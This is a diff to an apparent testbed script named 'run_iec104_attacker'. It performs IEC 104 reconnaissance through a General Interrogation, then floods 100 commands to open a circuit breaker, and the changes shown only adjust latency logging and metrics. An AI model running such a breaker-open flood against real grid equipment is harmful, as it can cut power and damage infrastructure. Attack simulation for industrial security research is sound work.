@@ -58,21 +58,17 @@ def run_iec104_attacker():
 
 		# Phase 1: Reconnaissance by triggering a General Interrogation.
 		print("[PHASE 1] Reconnaissance: trigger General Interrogation...")
-		recon_start = time.time()
 		try:
 			gi_ok = connection.interrogation(
 				common_address=1,
 				cause=c104.Cot.ACTIVATION,
 				qualifier=c104.Qoi.STATION,
 			)
-			recon_latency = (time.time() - recon_start)
 			if gi_ok:
-				print(f" [+] Recon completed in {recon_latency:.2f}s")
-				push_metric("attack_recon", "recon_latency", recon_latency)
+				print(f" [+] Attacker triggered General Interrogation successful.")
 				push_metric("attack_recon", "gi_ok", 1)
 			else:
-				print(f" [!] Recon failed in {recon_latency:.2f}s")
-				push_metric("attack_recon", "recon_latency", recon_latency)
+				print(f" [!] Attacker failed to trigger General Interrogation.")
 				push_metric("attack_recon", "gi_ok", 0)
 		except Exception as e:
 			print(f" Recon exception: {e}")
@@ -88,7 +84,7 @@ def run_iec104_attacker():
 				start_time = time.time()
 				breaker_cmd.value = False  # OPEN breaker
 				ok = breaker_cmd.transmit(cause=c104.Cot.ACTIVATION)
-				latency = (time.time() - start_time)
+				latency = (time.time() - start_time) * 1000	# ms
 
 				push_metric("attack_write_flood", "latency", latency)
 				push_metric("attack_write_flood", "open_cmd_value", 0)
@@ -102,7 +98,7 @@ def run_iec104_attacker():
 			except Exception as e:
 				print(f" Write error at attempt {i + 1}: {e}")
 
-		print(f" [+] Phase 2 complete. Successful OPEN commands: {success_count}/100")
+		print(f" [+] Phase 2 complete. Successful OPEN commands: {success_count}/100 in {latency:.2f} ms")
 		print("--- END ATTACK CAMPAIGN. WAIT 30 SECONDS ---\n")
 		time.sleep(30)
 
